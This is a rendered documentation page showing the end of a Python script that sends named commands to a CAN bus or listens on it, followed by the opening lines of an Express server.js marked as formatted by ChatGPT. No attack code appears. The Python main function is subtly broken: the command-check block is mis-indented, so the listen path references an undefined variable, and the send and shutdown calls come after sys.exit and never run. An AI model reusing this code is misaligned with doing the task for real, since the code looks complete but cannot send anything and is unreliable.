</span><span id="__span-9-43"><a id="__codelineno-9-43" name="__codelineno-9-43"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2"> | Received: </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span> <span class="c1"># You could add logic here to filter or react to specific messages</span>
</span><span id="__span-9-44"><a id="__codelineno-9-44" name="__codelineno-9-44"></a>            <span class="c1"># if msg.arbitration_id == 0x100:</span>
</span><span id="__span-9-45"><a id="__codelineno-9-45" name="__codelineno-9-45"></a>                <span class="c1"># print(" (Noise message)")</span>
</span><span id="__span-9-46"><a id="__codelineno-9-46" name="__codelineno-9-46"></a>
</span><span id="__span-9-47"><a id="__codelineno-9-47" name="__codelineno-9-47"></a>    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span><span id="__span-9-48"><a id="__codelineno-9-48" name="__codelineno-9-48"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">Stopping listener..."</span><span class="p">)</span>
</span><span id="__span-9-49"><a id="__codelineno-9-49" name="__codelineno-9-49"></a>
</span><span id="__span-9-50"><a id="__codelineno-9-50" name="__codelineno-9-50"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span id="__span-9-51"><a id="__codelineno-9-51" name="__codelineno-9-51"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="se">\n</span><span class="s2">An error occurred during listening: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-9-52"><a id="__codelineno-9-52" name="__codelineno-9-52"></a>
</span><span id="__span-9-53"><a id="__codelineno-9-53" name="__codelineno-9-53"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
</span><span id="__span-9-54"><a id="__codelineno-9-54" name="__codelineno-9-54"></a>    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">"Send CAN bus commands or listen for messages."</span><span class="p">)</span>
</span><span id="__span-9-55"><a id="__codelineno-9-55" name="__codelineno-9-55"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span><span id="__span-9-56"><a id="__codelineno-9-56" name="__codelineno-9-56"></a>        <span class="s2">"command"</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="n">COMMAND_CHOICES</span><span class="p">,</span>
</span><span id="__span-9-57"><a id="__codelineno-9-57" name="__codelineno-9-57"></a>        <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">"The command to send (</span><span class="si">{</span><span class="s1">', '</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span><span class="si">}</span><span class="s2">) or 'listen' to monitor the bus."</span> <span class="p">)</span>
</span><span id="__span-9-58"><a id="__codelineno-9-58" name="__codelineno-9-58"></a>    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span><span id="__span-9-59"><a id="__codelineno-9-59" name="__codelineno-9-59"></a>
</span><span id="__span-9-60"><a id="__codelineno-9-60" name="__codelineno-9-60"></a>    <span class="k">try</span><span class="p">:</span>
</span><span id="__span-9-61"><a id="__codelineno-9-61" name="__codelineno-9-61"></a>        <span class="c1"># Initialize the CAN bus interface</span>
</span><span id="__span-9-62"><a id="__codelineno-9-62" name="__codelineno-9-62"></a>        <span class="n">bus</span> <span class="o">=</span> <span class="n">can</span><span class="o">.</span><span class="n">interface</span><span class="o">.</span><span class="n">Bus</span><span class="p">(</span><span class="n">channel</span><span class="o">=</span><span class="n">IFACE_NAME</span><span class="p">,</span> <span class="n">interface</span><span class="o">=</span><span class="s1">'socketcan'</span><span class="p">,</span> <span class="n">receive_own_messages</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span><span id="__span-9-63"><a id="__codelineno-9-63" name="__codelineno-9-63"></a>        <span class="c1"># Set receive_own_messages if needed</span>
</span><span id="__span-9-64"><a id="__codelineno-9-64" name="__codelineno-9-64"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Successfully connected to </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">."</span><span class="p">)</span>
</span><span id="__span-9-65"><a id="__codelineno-9-65" name="__codelineno-9-65"></a>
</span><span id="__span-9-66"><a id="__codelineno-9-66" name="__codelineno-9-66"></a>    <span class="k">except</span> <span class="ne">OSError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span id="__span-9-67"><a id="__codelineno-9-67" name="__codelineno-9-67"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Error connecting to CAN interface </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-9-68"><a id="__codelineno-9-68" name="__codelineno-9-68"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Make sure the </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2"> interface is up ('sudo ip link set up </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">')"</span><span class="p">)</span>
</span><span id="__span-9-69"><a id="__codelineno-9-69" name="__codelineno-9-69"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">"And that you have the necessary permissions."</span><span class="p">)</span>
</span><span id="__span-9-70"><a id="__codelineno-9-70" name="__codelineno-9-70"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span id="__span-9-71"><a id="__codelineno-9-71" name="__codelineno-9-71"></a>
</span><span id="__span-9-72"><a id="__codelineno-9-72" name="__codelineno-9-72"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span id="__span-9-73"><a id="__codelineno-9-73" name="__codelineno-9-73"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"An unexpected error occurred during bus initialization: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-9-74"><a id="__codelineno-9-74" name="__codelineno-9-74"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span id="__span-9-75"><a id="__codelineno-9-75" name="__codelineno-9-75"></a>
</span><span id="__span-9-76"><a id="__codelineno-9-76" name="__codelineno-9-76"></a>    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">==</span> <span class="s2">"listen"</span><span class="p">:</span>
</span><span id="__span-9-77"><a id="__codelineno-9-77" name="__codelineno-9-77"></a>        <span class="n">listen_for_messages</span><span class="p">(</span><span class="n">bus</span><span class="p">)</span>
</span><span id="__span-9-78"><a id="__codelineno-9-78" name="__codelineno-9-78"></a>    <span class="k">else</span><span class="p">:</span>
</span><span id="__span-9-79"><a id="__codelineno-9-79" name="__codelineno-9-79"></a>        <span class="n">command_id</span> <span class="o">=</span> <span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="p">)</span>
</span><span id="__span-9-80"><a id="__codelineno-9-80" name="__codelineno-9-80"></a>
</span><span id="__span-9-81"><a id="__codelineno-9-81" name="__codelineno-9-81"></a>    <span class="k">if</span> <span class="n">command_id</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span><span id="__span-9-82"><a id="__codelineno-9-82" name="__codelineno-9-82"></a>        <span class="c1"># Should not happen due to choices constraint</span>
</span><span id="__span-9-83"><a id="__codelineno-9-83" name="__codelineno-9-83"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Invalid command for sending: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</span><span id="__span-9-84"><a id="__codelineno-9-84" name="__codelineno-9-84"></a>
</span><span id="__span-9-85"><a id="__codelineno-9-85" name="__codelineno-9-85"></a>        <span class="n">bus</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
</span><span id="__span-9-86"><a id="__codelineno-9-86" name="__codelineno-9-86"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span id="__span-9-87"><a id="__codelineno-9-87" name="__codelineno-9-87"></a>        <span class="n">send_command</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">command_id</span><span class="p">)</span>
</span><span id="__span-9-88"><a id="__codelineno-9-88" name="__codelineno-9-88"></a>        <span class="c1"># Give a moment for the message to be potentially processed if listening elsewhere</span>
</span><span id="__span-9-89"><a id="__codelineno-9-89" name="__codelineno-9-89"></a>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span id="__span-9-90"><a id="__codelineno-9-90" name="__codelineno-9-90"></a>        <span class="c1"># Shutdown the bus connection cleanly</span>
</span><span id="__span-9-91"><a id="__codelineno-9-91" name="__codelineno-9-91"></a>        <span class="n">bus</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
</span><span id="__span-9-92"><a id="__codelineno-9-92" name="__codelineno-9-92"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">"CAN bus connection closed."</span><span class="p">)</span>
</span><span id="__span-9-93"><a id="__codelineno-9-93" name="__codelineno-9-93"></a>
</span><span id="__span-9-94"><a id="__codelineno-9-94" name="__codelineno-9-94"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
</span><span id="__span-9-95"><a id="__codelineno-9-95" name="__codelineno-9-95"></a>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></div></td></tr></tbody></table></div>
</details>
<details class="note">
<summary>server.js</summary>
<p>This file contains the logic used to drive the wegpage.</p>
<div class="admonition example">
<p class="admonition-title">AI usage</p>
<p>Script was formatted by ChatGPT.</p>
</div>
<div class="language-js highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">server.js</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">  1</a></span>
<span class="normal"><a href="#__codelineno-10-2">  2</a></span>
<span class="normal"><a href="#__codelineno-10-3">  3</a></span>
<span class="normal"><a href="#__codelineno-10-4">  4</a></span>
<span class="normal"><a href="#__codelineno-10-5">  5</a></span>
<span class="normal"><a href="#__codelineno-10-6">  6</a></span>
<span class="normal"><a href="#__codelineno-10-7">  7</a></span>
<span class="normal"><a href="#__codelineno-10-8">  8</a></span>
<span class="normal"><a href="#__codelineno-10-9">  9</a></span>
<span class="normal"><a href="#__codelineno-10-10"> 10</a></span>
<span class="normal"><a href="#__codelineno-10-11"> 11</a></span>
<span class="normal"><a href="#__codelineno-10-12"> 12</a></span>
<span class="normal"><a href="#__codelineno-10-13"> 13</a></span>
<span class="normal"><a href="#__codelineno-10-14"> 14</a></span>
<span class="normal"><a href="#__codelineno-10-15"> 15</a></span>
<span class="normal"><a href="#__codelineno-10-16"> 16</a></span>
<span class="normal"><a href="#__codelineno-10-17"> 17</a></span>
<span class="normal"><a href="#__codelineno-10-18"> 18</a></span>
<span class="normal"><a href="#__codelineno-10-19"> 19</a></span>
<span class="normal"><a href="#__codelineno-10-20"> 20</a></span>
<span class="normal"><a href="#__codelineno-10-21"> 21</a></span>
<span class="normal"><a href="#__codelineno-10-22"> 22</a></span>
<span class="normal"><a href="#__codelineno-10-23"> 23</a></span>
<span class="normal"><a href="#__codelineno-10-24"> 24</a></span>
<span class="normal"><a href="#__codelineno-10-25"> 25</a></span>
<span class="normal"><a href="#__codelineno-10-26"> 26</a></span>
<span class="normal"><a href="#__codelineno-10-27"> 27</a></span>
<span class="normal"><a href="#__codelineno-10-28"> 28</a></span>
<span class="normal"><a href="#__codelineno-10-29"> 29</a></span>
<span class="normal"><a href="#__codelineno-10-30"> 30</a></span>
<span class="normal"><a href="#__codelineno-10-31"> 31</a></span>
<span class="normal"><a href="#__codelineno-10-32"> 32</a></span>
<span class="normal"><a href="#__codelineno-10-33"> 33</a></span>
<span class="normal"><a href="#__codelineno-10-34"> 34</a></span>
<span class="normal"><a href="#__codelineno-10-35"> 35</a></span>
<span class="normal"><a href="#__codelineno-10-36"> 36</a></span>
<span class="normal"><a href="#__codelineno-10-37"> 37</a></span>
<span class="normal"><a href="#__codelineno-10-38"> 38</a></span>
<span class="normal"><a href="#__codelineno-10-39"> 39</a></span>
<span class="normal"><a href="#__codelineno-10-40"> 40</a></span>
<span class="normal"><a href="#__codelineno-10-41"> 41</a></span>
<span class="normal"><a href="#__codelineno-10-42"> 42</a></span>
<span class="normal"><a href="#__codelineno-10-43"> 43</a></span>
<span class="normal"><a href="#__codelineno-10-44"> 44</a></span>
<span class="normal"><a href="#__codelineno-10-45"> 45</a></span>
<span class="normal"><a href="#__codelineno-10-46"> 46</a></span>
<span class="normal"><a href="#__codelineno-10-47"> 47</a></span>
<span class="normal"><a href="#__codelineno-10-48"> 48</a></span>
<span class="normal"><a href="#__codelineno-10-49"> 49</a></span>
<span class="normal"><a href="#__codelineno-10-50"> 50</a></span>
<span class="normal"><a href="#__codelineno-10-51"> 51</a></span>
<span class="normal"><a href="#__codelineno-10-52"> 52</a></span>
<span class="normal"><a href="#__codelineno-10-53"> 53</a></span>
<span class="normal"><a href="#__codelineno-10-54"> 54</a></span>
<span class="normal"><a href="#__codelineno-10-55"> 55</a></span>
<span class="normal"><a href="#__codelineno-10-56"> 56</a></span>
<span class="normal"><a href="#__codelineno-10-57"> 57</a></span>
<span class="normal"><a href="#__codelineno-10-58"> 58</a></span>
<span class="normal"><a href="#__codelineno-10-59"> 59</a></span>
<span class="normal"><a href="#__codelineno-10-60"> 60</a></span>
<span class="normal"><a href="#__codelineno-10-61"> 61</a></span>
<span class="normal"><a href="#__codelineno-10-62"> 62</a></span>
<span class="normal"><a href="#__codelineno-10-63"> 63</a></span>
<span class="normal"><a href="#__codelineno-10-64"> 64</a></span>
<span class="normal"><a href="#__codelineno-10-65"> 65</a></span>
<span class="normal"><a href="#__codelineno-10-66"> 66</a></span>
<span class="normal"><a href="#__codelineno-10-67"> 67</a></span>
<span class="normal"><a href="#__codelineno-10-68"> 68</a></span>
<span class="normal"><a href="#__codelineno-10-69"> 69</a></span>
<span class="normal"><a href="#__codelineno-10-70"> 70</a></span>
<span class="normal"><a href="#__codelineno-10-71"> 71</a></span>
<span class="normal"><a href="#__codelineno-10-72"> 72</a></span>
<span class="normal"><a href="#__codelineno-10-73"> 73</a></span>
<span class="normal"><a href="#__codelineno-10-74"> 74</a></span>
<span class="normal"><a href="#__codelineno-10-75"> 75</a></span>
<span class="normal"><a href="#__codelineno-10-76"> 76</a></span>
<span class="normal"><a href="#__codelineno-10-77"> 77</a></span>
<span class="normal"><a href="#__codelineno-10-78"> 78</a></span>
<span class="normal"><a href="#__codelineno-10-79"> 79</a></span>
<span class="normal"><a href="#__codelineno-10-80"> 80</a></span>
<span class="normal"><a href="#__codelineno-10-81"> 81</a></span>
<span class="normal"><a href="#__codelineno-10-82"> 82</a></span>
<span class="normal"><a href="#__codelineno-10-83"> 83</a></span>
<span class="normal"><a href="#__codelineno-10-84"> 84</a></span>
<span class="normal"><a href="#__codelineno-10-85"> 85</a></span>
<span class="normal"><a href="#__codelineno-10-86"> 86</a></span>
<span class="normal"><a href="#__codelineno-10-87"> 87</a></span>
<span class="normal"><a href="#__codelineno-10-88"> 88</a></span>
<span class="normal"><a href="#__codelineno-10-89"> 89</a></span>
<span class="normal"><a href="#__codelineno-10-90"> 90</a></span>
<span class="normal"><a href="#__codelineno-10-91"> 91</a></span>
<span class="normal"><a href="#__codelineno-10-92"> 92</a></span>
<span class="normal"><a href="#__codelineno-10-93"> 93</a></span>
<span class="normal"><a href="#__codelineno-10-94"> 94</a></span>
<span class="normal"><a href="#__codelineno-10-95"> 95</a></span>
<span class="normal"><a href="#__codelineno-10-96"> 96</a></span>
<span class="normal"><a href="#__codelineno-10-97"> 97</a></span>
<span class="normal"><a href="#__codelineno-10-98"> 98</a></span>
<span class="normal"><a href="#__codelineno-10-99"> 99</a></span>
<span class="normal"><a href="#__codelineno-10-100">100</a></span>
<span class="normal"><a href="#__codelineno-10-101">101</a></span>
<span class="normal"><a href="#__codelineno-10-102">102</a></span>
<span class="normal"><a href="#__codelineno-10-103">103</a></span>
<span class="normal"><a href="#__codelineno-10-104">104</a></span>
<span class="normal"><a href="#__codelineno-10-105">105</a></span>
<span class="normal"><a href="#__codelineno-10-106">106</a></span>
<span class="normal"><a href="#__codelineno-10-107">107</a></span>
<span class="normal"><a href="#__codelineno-10-108">108</a></span>
<span class="normal"><a href="#__codelineno-10-109">109</a></span>
<span class="normal"><a href="#__codelineno-10-110">110</a></span>
<span class="normal"><a href="#__codelineno-10-111">111</a></span>
<span class="normal"><a href="#__codelineno-10-112">112</a></span>
<span class="normal"><a href="#__codelineno-10-113">113</a></span>
<span class="normal"><a href="#__codelineno-10-114">114</a></span>
<span class="normal"><a href="#__codelineno-10-115">115</a></span>
<span class="normal"><a href="#__codelineno-10-116">116</a></span>
<span class="normal"><a href="#__codelineno-10-117">117</a></span>
<span class="normal"><a href="#__codelineno-10-118">118</a></span>
<span class="normal"><a href="#__codelineno-10-119">119</a></span>
<span class="normal"><a href="#__codelineno-10-120">120</a></span>
<span class="normal"><a href="#__codelineno-10-121">121</a></span>
<span class="normal"><a href="#__codelineno-10-122">122</a></span>
<span class="normal"><a href="#__codelineno-10-123">123</a></span>
<span class="normal"><a href="#__codelineno-10-124">124</a></span>
<span class="normal"><a href="#__codelineno-10-125">125</a></span>
<span class="normal"><a href="#__codelineno-10-126">126</a></span>
<span class="normal"><a href="#__codelineno-10-127">127</a></span>
<span class="normal"><a href="#__codelineno-10-128">128</a></span>
<span class="normal"><a href="#__codelineno-10-129">129</a></span>
<span class="normal"><a href="#__codelineno-10-130">130</a></span>
<span class="normal"><a href="#__codelineno-10-131">131</a></span>
<span class="normal"><a href="#__codelineno-10-132">132</a></span>
<span class="normal"><a href="#__codelineno-10-133">133</a></span>
<span class="normal"><a href="#__codelineno-10-134">134</a></span>
<span class="normal"><a href="#__codelineno-10-135">135</a></span>
<span class="normal"><a href="#__codelineno-10-136">136</a></span>
<span class="normal"><a href="#__codelineno-10-137">137</a></span>
<span class="normal"><a href="#__codelineno-10-138">138</a></span>
<span class="normal"><a href="#__codelineno-10-139">139</a></span>
<span class="normal"><a href="#__codelineno-10-140">140</a></span>
<span class="normal"><a href="#__codelineno-10-141">141</a></span>
<span class="normal"><a href="#__codelineno-10-142">142</a></span>
<span class="normal"><a href="#__codelineno-10-143">143</a></span>
<span class="normal"><a href="#__codelineno-10-144">144</a></span>
<span class="normal"><a href="#__codelineno-10-145">145</a></span>
<span class="normal"><a href="#__codelineno-10-146">146</a></span>
<span class="normal"><a href="#__codelineno-10-147">147</a></span>
<span class="normal"><a href="#__codelineno-10-148">148</a></span>
<span class="normal"><a href="#__codelineno-10-149">149</a></span>
<span class="normal"><a href="#__codelineno-10-150">150</a></span>
<span class="normal"><a href="#__codelineno-10-151">151</a></span>
<span class="normal"><a href="#__codelineno-10-152">152</a></span>
<span class="normal"><a href="#__codelineno-10-153">153</a></span>
<span class="normal"><a href="#__codelineno-10-154">154</a></span>
<span class="normal"><a href="#__codelineno-10-155">155</a></span>
<span class="normal"><a href="#__codelineno-10-156">156</a></span>
<span class="normal"><a href="#__codelineno-10-157">157</a></span>
<span class="normal"><a href="#__codelineno-10-158">158</a></span>
<span class="normal"><a href="#__codelineno-10-159">159</a></span>
<span class="normal"><a href="#__codelineno-10-160">160</a></span>
<span class="normal"><a href="#__codelineno-10-161">161</a></span>
<span class="normal"><a href="#__codelineno-10-162">162</a></span>
<span class="normal"><a href="#__codelineno-10-163">163</a></span>
<span class="normal"><a href="#__codelineno-10-164">164</a></span>
<span class="normal"><a href="#__codelineno-10-165">165</a></span>
<span class="normal"><a href="#__codelineno-10-166">166</a></span>
<span class="normal"><a href="#__codelineno-10-167">167</a></span>
<span class="normal"><a href="#__codelineno-10-168">168</a></span>
<span class="normal"><a href="#__codelineno-10-169">169</a></span>
<span class="normal"><a href="#__codelineno-10-170">170</a></span>
<span class="normal"><a href="#__codelineno-10-171">171</a></span>
<span class="normal"><a href="#__codelineno-10-172">172</a></span>
<span class="normal"><a href="#__codelineno-10-173">173</a></span>
<span class="normal"><a href="#__codelineno-10-174">174</a></span>
<span class="normal"><a href="#__codelineno-10-175">175</a></span>
<span class="normal"><a href="#__codelineno-10-176">176</a></span>
<span class="normal"><a href="#__codelineno-10-177">177</a></span>
<span class="normal"><a href="#__codelineno-10-178">178</a></span>
<span class="normal"><a href="#__codelineno-10-179">179</a></span>
<span class="normal"><a href="#__codelineno-10-180">180</a></span>
<span class="normal"><a href="#__codelineno-10-181">181</a></span>
<span class="normal"><a href="#__codelineno-10-182">182</a></span>
<span class="normal"><a href="#__codelineno-10-183">183</a></span>
<span class="normal"><a href="#__codelineno-10-184">184</a></span>
<span class="normal"><a href="#__codelineno-10-185">185</a></span>
<span class="normal"><a href="#__codelineno-10-186">186</a></span>
<span class="normal"><a href="#__codelineno-10-187">187</a></span>
<span class="normal"><a href="#__codelineno-10-188">188</a></span>
<span class="normal"><a href="#__codelineno-10-189">189</a></span>
<span class="normal"><a href="#__codelineno-10-190">190</a></span>
<span class="normal"><a href="#__codelineno-10-191">191</a></span>
<span class="normal"><a href="#__codelineno-10-192">192</a></span>
<span class="normal"><a href="#__codelineno-10-193">193</a></span>
<span class="normal"><a href="#__codelineno-10-194">194</a></span>
<span class="normal"><a href="#__codelineno-10-195">195</a></span>
<span class="normal"><a href="#__codelineno-10-196">196</a></span>
<span class="normal"><a href="#__codelineno-10-197">197</a></span>
<span class="normal"><a href="#__codelineno-10-198">198</a></span>
<span class="normal"><a href="#__codelineno-10-199">199</a></span>
<span class="normal"><a href="#__codelineno-10-200">200</a></span>
<span class="normal"><a href="#__codelineno-10-201">201</a></span>
<span class="normal"><a href="#__codelineno-10-202">202</a></span>
<span class="normal"><a href="#__codelineno-10-203">203</a></span>
<span class="normal"><a href="#__codelineno-10-204">204</a></span>
<span class="normal"><a href="#__codelineno-10-205">205</a></span>
<span class="normal"><a href="#__codelineno-10-206">206</a></span>
<span class="normal"><a href="#__codelineno-10-207">207</a></span>
<span class="normal"><a href="#__codelineno-10-208">208</a></span>
<span class="normal"><a href="#__codelineno-10-209">209</a></span>
<span class="normal"><a href="#__codelineno-10-210">210</a></span>
<span class="normal"><a href="#__codelineno-10-211">211</a></span>
<span class="normal"><a href="#__codelineno-10-212">212</a></span>
<span class="normal"><a href="#__codelineno-10-213">213</a></span>
<span class="normal"><a href="#__codelineno-10-214">214</a></span>
<span class="normal"><a href="#__codelineno-10-215">215</a></span>
<span class="normal"><a href="#__codelineno-10-216">216</a></span>
<span class="normal"><a href="#__codelineno-10-217">217</a></span>
<span class="normal"><a href="#__codelineno-10-218">218</a></span>
<span class="normal"><a href="#__codelineno-10-219">219</a></span>
<span class="normal"><a href="#__codelineno-10-220">220</a></span>
<span class="normal"><a href="#__codelineno-10-221">221</a></span>
<span class="normal"><a href="#__codelineno-10-222">222</a></span>
<span class="normal"><a href="#__codelineno-10-223">223</a></span>
<span class="normal"><a href="#__codelineno-10-224">224</a></span>
<span class="normal"><a href="#__codelineno-10-225">225</a></span>
<span class="normal"><a href="#__codelineno-10-226">226</a></span>
<span class="normal"><a href="#__codelineno-10-227">227</a></span>
<span class="normal"><a href="#__codelineno-10-228">228</a></span>
<span class="normal"><a href="#__codelineno-10-229">229</a></span>
<span class="normal"><a href="#__codelineno-10-230">230</a></span>
<span class="normal"><a href="#__codelineno-10-231">231</a></span>
<span class="normal"><a href="#__codelineno-10-232">232</a></span>
<span class="normal"><a href="#__codelineno-10-233">233</a></span>
<span class="normal"><a href="#__codelineno-10-234">234</a></span>
<span class="normal"><a href="#__codelineno-10-235">235</a></span>
<span class="normal"><a href="#__codelineno-10-236">236</a></span>
<span class="normal"><a href="#__codelineno-10-237">237</a></span>
<span class="normal"><a href="#__codelineno-10-238">238</a></span>
<span class="normal"><a href="#__codelineno-10-239">239</a></span>
<span class="normal"><a href="#__codelineno-10-240">240</a></span>
<span class="normal"><a href="#__codelineno-10-241">241</a></span>
<span class="normal"><a href="#__codelineno-10-242">242</a></span>
<span class="normal"><a href="#__codelineno-10-243">243</a></span>
<span class="normal"><a href="#__codelineno-10-244">244</a></span>
<span class="normal"><a href="#__codelineno-10-245">245</a></span>
<span class="normal"><a href="#__codelineno-10-246">246</a></span>
<span class="normal"><a href="#__codelineno-10-247">247</a></span>
<span class="normal"><a href="#__codelineno-10-248">248</a></span>
<span class="normal"><a href="#__codelineno-10-249">249</a></span>
<span class="normal"><a href="#__codelineno-10-250">250</a></span>
<span class="normal"><a href="#__codelineno-10-251">251</a></span>
<span class="normal"><a href="#__codelineno-10-252">252</a></span>
<span class="normal"><a href="#__codelineno-10-253">253</a></span>
<span class="normal"><a href="#__codelineno-10-254">254</a></span>
<span class="normal"><a href="#__codelineno-10-255">255</a></span>
<span class="normal"><a href="#__codelineno-10-256">256</a></span>
<span class="normal"><a href="#__codelineno-10-257">257</a></span>
<span class="normal"><a href="#__codelineno-10-258">258</a></span>
<span class="normal"><a href="#__codelineno-10-259">259</a></span>
<span class="normal"><a href="#__codelineno-10-260">260</a></span>
<span class="normal"><a href="#__codelineno-10-261">261</a></span>
<span class="normal"><a href="#__codelineno-10-262">262</a></span>
<span class="normal"><a href="#__codelineno-10-263">263</a></span>
<span class="normal"><a href="#__codelineno-10-264">264</a></span>
<span class="normal"><a href="#__codelineno-10-265">265</a></span>
<span class="normal"><a href="#__codelineno-10-266">266</a></span>
<span class="normal"><a href="#__codelineno-10-267">267</a></span>
<span class="normal"><a href="#__codelineno-10-268">268</a></span>
<span class="normal"><a href="#__codelineno-10-269">269</a></span>
<span class="normal"><a href="#__codelineno-10-270">270</a></span>
<span class="normal"><a href="#__codelineno-10-271">271</a></span>
<span class="normal"><a href="#__codelineno-10-272">272</a></span>
<span class="normal"><a href="#__codelineno-10-273">273</a></span>
<span class="normal"><a href="#__codelineno-10-274">274</a></span>
<span class="normal"><a href="#__codelineno-10-275">275</a></span>
<span class="normal"><a href="#__codelineno-10-276">276</a></span>
<span class="normal"><a href="#__codelineno-10-277">277</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="nx">require</span><span class="p">(</span><span class="s2">"dotenv"</span><span class="p">).</span><span class="nx">config</span><span class="p">();</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"express"</span><span class="p">);</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="kd">const</span><span class="w"> </span><span class="nx">dns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"dns"</span><span class="p">);</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="kd">const</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"path"</span><span class="p">);</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">exec</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">);</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a><span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">();</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="c1">// --- Environment Variables &amp; Initial Setup ---</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10"></a><span class="kd">const</span><span class="w"> </span><span class="nx">PARENTID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PARENTID</span><span class="p">;</span>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11"></a><span class="kd">let</span><span class="w"> </span><span class="nx">allowedIps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12"></a>
